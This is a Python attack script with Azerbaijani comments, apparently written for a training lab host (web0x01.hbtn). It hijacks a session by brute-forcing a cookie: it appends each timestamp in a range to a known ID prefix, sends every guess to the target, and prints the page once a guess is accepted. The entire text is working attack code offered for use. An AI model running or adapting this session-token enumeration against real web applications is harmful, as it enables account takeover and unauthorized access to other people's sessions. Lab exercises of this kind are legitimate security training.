import requests

# Hədəf məlumatları
url = "http://web0x01.hbtn/a1/hijack_session"
base_cookie_name = "hijack_session"

# Sizin müəyyən etdiyiniz çatışmayan hissə
missing_id_prefix = "e9f2bbd7-4ed6-4be6-9ee-8370386"

# Aralıq (Sizin verdiyiniz siyahıya əsasən)
start_ts = 17688337843  # 8370385-in sonu
end_ts = 17688337920    # 8370387-nin əvvəli

print(f"[*] Hücum başlayır: {start_ts} və {end_ts} arası yoxlanılır...")

for ts in range(start_ts + 1, end_ts):
    candidate_cookie = f"{missing_id_prefix}-{ts}"
    cookies = {base_cookie_name: candidate_cookie}
    
    try:
        # Sessiyanı yoxlayırıq
        response = requests.get(url, cookies=cookies, timeout=5)
        
        # Əgər cavab fərqlidirsə (məsələn, uzunluq dəyişibsə və ya içində xüsusi söz varsa)
        # Aşağıdakı şərti saytın verdiyi cavaba görə dəyişə bilərsiniz
        if response.status_code == 200 and "unauthorized" not in response.text.lower():
            print(f"[+] Tapıldı! Doğru Cookie: {candidate_cookie}")
            print(f"Səhifə məzmunu: {response.text[:100]}...") # İlk 100 simvol
            break
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Xəta baş verdi: {e}")
        break

print("[*] Proses bitdi.")
